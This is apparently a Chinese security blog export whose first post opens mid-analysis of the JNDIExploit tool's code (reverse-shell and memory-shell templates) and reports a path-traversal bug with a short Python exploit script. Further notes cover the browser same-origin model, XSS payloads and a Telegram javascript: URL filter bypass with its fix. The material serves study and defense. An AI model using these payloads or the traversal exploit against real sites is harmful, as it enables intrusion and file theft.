str.split(<span class="string">&quot;=&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    params.put(parts[<span class="number">0</span>], parts[<span class="number">1</span>]);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    <span class="comment">//continue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">//continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功</span></span><br><span class="line"><span class="comment">         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题</span></span><br><span class="line"><span class="comment">         目前暂时认为其不会有问题，如果有问题，后面再修改</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">createJar</span><span class="params">(String type, String... params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;xExportObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">CommandTemplate</span> <span class="variable">commandTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommandTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = commandTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;dnslog&quot;</span>))&#123;</span><br><span class="line">            <span class="type">DnslogTemplate</span> <span class="variable">dnslogTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DnslogTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = dnslogTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ReverseShellTemplate</span> <span class="variable">reverseShellTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReverseShellTemplate</span>(params[<span class="number">0</span>], params[<span class="number">1</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = reverseShellTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;webspherememshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">exploitClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.feihong.ldap.template.WebsphereMemshellTemplate&quot;</span>);</span><br><span class="line">            exploitClass.setName(className);</span><br><span class="line">            exploitClass.detach();</span><br><span class="line">            bytes = exploitClass.toBytecode();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Name of Class in Jar: &quot;</span> + className);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">JarOutputStream</span> <span class="variable">jarOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(bout);</span><br><span class="line">        jarOut.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(className + <span class="string">&quot;.class&quot;</span>));</span><br><span class="line">        jarOut.write(bytes);</span><br><span class="line">        jarOut.closeEntry();</span><br><span class="line">        jarOut.close();</span><br><span class="line">        bout.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> Util.getRandomString();</span><br><span class="line">        Cache.set(jarName, bout.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jarName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当后缀名不属于if else中的任意一种的时候会进入<code>handleFileRequest</code>中。<br>看看内部处理<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">       <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">       <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">           fileInputStream.read(bytes);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">           exchange.getResponseBody().write(bytes);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       exchange.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>他会获取最后一个<code>/</code>并与当前pwd拼接，但是在Windows系统中，路径是用<code>\</code>进行表示的，所以在windows上运行该工具会造成相应的任意文件读取。<br>这里我用python进行攻击<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/4.png" alt><br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/3.png" alt><br>可以看到返回了文件内容。而我d盘下也确实有该文件<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/5.png" alt><br>当然不止<code>handleFileRequest</code>有这个问题，其他的函数都是这么处理的，所以都会导致该漏洞的产生。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filename = <span class="string">&#x27;..\\..\\..\\..\\..\\flag&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:3456/&quot;</span></span><br><span class="line">r = requests.get(url+filename)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>IELTS learning by chatgpt</title>
    <url>/2023/09/17/IELTS-learning-by-chatgpt/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>前端安全1-浏览器安全模型（笔记）</title>
    <url>/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/users/20091346/ironman/6155">https://ithelp.ithome.com.tw/users/20091346/ironman/6155</a></li>
<li><a href="https://blog.huli.tw/">https://blog.huli.tw/</a></li>
</ul>
<p>因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了<br><span id="more"></span></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10314125">https://ithelp.ithome.com.tw/articles/10314125</a></li>
</ul>
<h2 id="前端运行环境"><a href="#前端运行环境" class="headerlink" title="前端运行环境"></a>前端运行环境</h2><p><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>先看到上图，前端是运行在浏览器之中的，而浏览器会给前端一大堆的限制</p>
<h3 id="禁止主动文件读取"><a href="#禁止主动文件读取" class="headerlink" title="禁止主动文件读取"></a>禁止主动文件读取</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> onchange=<span class="string">&quot;show(this)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">input</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="property">onload</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(event.<span class="property">target</span>.<span class="property">result</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="title function_">readAsText</span>(input.<span class="property">files</span>[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这段代码创建了一个input元素，用于上传文件。当文件选择框中选择了文件后，会触发onchange事件，执行show函数。show函数创建了一个FileReader对象，用于读取上传的文件。然后将读取的文件内容转换为文本格式，并通过alert弹窗显示出来。<br>这种只能是人工选择的时候可以读取到，但是不能主动去读取。</p>
<p>当然也有可以绕过的特例</p>
<ul>
<li><a href="https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser">https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser</a></li>
</ul>
<p>他是利用了opera: 这个协议有着更高的权限，和一些特殊功能，可以用来访问文件，截图网页等<br>更多细节可以看上面的原文，在这里不过多赘述<br>总结一下就是利用opera访问文件然后对文件内容做了个截图以后回传到攻击端</p>
<h3 id="禁止使用系统api"><a href="#禁止使用系统api" class="headerlink" title="禁止使用系统api"></a>禁止使用系统api</h3><p>这里只能使用一些浏览器提供的函数，比如fetch之类的<br>当然浏览器也会开放一些api</p>
<ul>
<li>Web Bluetooth API</li>
<li>MediaDevices API</li>
</ul>
<h3 id="禁止读取其他网页的内容"><a href="#禁止读取其他网页的内容" class="headerlink" title="禁止读取其他网页的内容"></a>禁止读取其他网页的内容</h3><p>我的kaikaix.github.io是读取不到google.com的任何内容的，这种就是同源策略(same-origin policy)，简称SOP<br>当在控制台输入以下代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://kaikaix.github.io&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(win.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><br>这段代码创建了一个新的浏览器窗口并打开了一个指定的网页。然后使用setTimeout函数在3秒后输出新窗口的URL地址。<br>我在blog.huli.tw网站下开启控制台执行的结果如下<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>但是如果我在kaikaix.github.io执行的话<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>就可以成功输出url</p>
<p>当然也有方法可以拿到其他网站的信息<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1">https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1</a></p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全2-基础xss（笔记）</title>
    <url>/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一下基础的xss，等着huli大佬写奇淫技巧</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10314883">https://ithelp.ithome.com.tw/articles/10314883</a><span id="more"></span>
</li>
</ul>
<h2 id="触发js代码"><a href="#触发js代码" class="headerlink" title="触发js代码"></a>触发js代码</h2><p>一般来说是用script标签去触发的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>但是除了script标签，还可以用inline event handler来进行触发<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;not_exist&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml">&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>常见的用来触发event handler的有</p>
<ul>
<li>onerror</li>
<li>onload</li>
<li>onfocus</li>
<li>onblur</li>
<li>onanimationend</li>
<li>onclick</li>
<li>onmouseenter</li>
</ul>
<p>等等</p>
<p>当然还可以用伪协议去触发js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure><br>这里有个值得注意的点，可以把href后面的伪协议当做字符串，这时候如果用了html编码也可以触发js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6a;<span class="attr">avascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>在这个网站有更多的payload<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
<h2 id="不同的xss"><a href="#不同的xss" class="headerlink" title="不同的xss"></a>不同的xss</h2><h3 id="注入html"><a href="#注入html" class="headerlink" title="注入html"></a>注入html</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Hello, &lt;h1&gt;&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种就直接htmlspecialchar就可以过滤了，比较常见不多赘述了</p>
<h3 id="注入属性"><a href="#注入属性" class="headerlink" title="注入属性"></a>注入属性</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> clazz = qs.<span class="title function_">get</span>(<span class="string">&#x27;clazz&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;div class=&quot;<span class="subst">$&#123;clazz&#125;</span>&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">      Demo</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">  `</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这段代码会获取get参数的clazz，并拼接到<code>&lt;div class=&quot;&quot;&gt;</code>中</p>
<p>那么注入xss的方式有几种</p>
<p>第一种闭合div，增加一个标签<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=not_exist onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>那么代码就会变为<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">not_exist</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span></span><br><span class="line"><span class="language-xml">  Demo</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>第二种闭合”然后增加属性<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; tabindex=1 onfocus=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot; x=&quot;</span></span><br></pre></td></tr></table></figure><br>那么就会变成<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span> tabindex=<span class="number">1</span> onfocus=<span class="string">&quot;alert(1)&quot;</span> x=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">Demo</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="注入到js中"><a href="#注入到js中" class="headerlink" title="注入到js中"></a>注入到js中</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = `<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="meta">?&gt;</span>`;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>当代码是这样的时候<br><code>?name=$&#123;alert(1)&#125;</code>可以用这种语句去注入js</p>
<p>如果是用双引号的形式，如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = <span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_GET</span>[&#x27;name&#x27;]) ?&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样可能就没法进行注入js了，但是如果没有htmlspecialchars过滤的话，就可以用闭合<code>&quot;</code>或者闭合<code>&lt;script&gt;</code>标签进行注入,在注入其他标签<br>例如<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;;alert(1);&quot;</span></span><br><span class="line">name=&lt;/script&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全3-js伪协议（笔记）</title>
    <url>/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10315118">https://ithelp.ithome.com.tw/articles/10315118</a><span id="more"></span>
<h2 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h2>可以触发的标签<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">f2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">form</span>=<span class="string">f2</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(2)</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
这种一般都是容易被忽略的注入xss的点，看到下面的代码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$data</span>) ?&gt;&quot;</span>&gt;link&lt;/a&gt;`</span><br></pre></td></tr></table></figure>
虽然他被html编码了，但是仍然可以用伪协议去触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></li>
</ul>
<p>当然，<code>window.location</code>也是可以触发伪协议的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>上面已经提到过了，html编码是行不通的，直接删掉javascript，攻击者就可以通过下面的代码进行绕过<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&amp;#106avascript:alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>所以一般是通过白名单的方式，验证他的开头是否是http或者https这样<br>在tg中就出现过这样的问题<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">includes</span>(<span class="string">&#x27;://&#x27;</span>) ? url : <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>他并没有判断开头是否是<code>http://</code>或者是<code>https://</code>，所以导致攻击者可以用下面的代码进行绕过<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;://&#x27;</span>)</span><br></pre></td></tr></table></figure><br>但是要在服务器也会判断上面的代码是否合规，那上面的代码显然不行，不过攻击者用了一种特殊写法绕过了。<br>URL的完全体一般是长下面的样子的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://username:password@www.example.com/</span><br></pre></td></tr></table></figure><br>所以构造绕过payload<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;Slonser was here!&#x27;</span>);<span class="comment">//@github.com</span></span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Slonser was here!&#x27;);//@github.com&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就能弹窗了<br>tg的修复方式如下<br><a href="https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44">https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// HTTP was chosen by default as a fix for https://bugs.telegram.org/c/10712.</span></span><br><span class="line">  <span class="comment">// It is also the default protocol in the official TDesktop client.</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">    <span class="comment">// eslint-disable-next-line no-script-url</span></span><br><span class="line">    <span class="keyword">if</span> (parsedUrl.<span class="property">protocol</span> === <span class="string">&#x27;javascript:&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>利用URL去解析url，并提取出protocol，并判断</p>
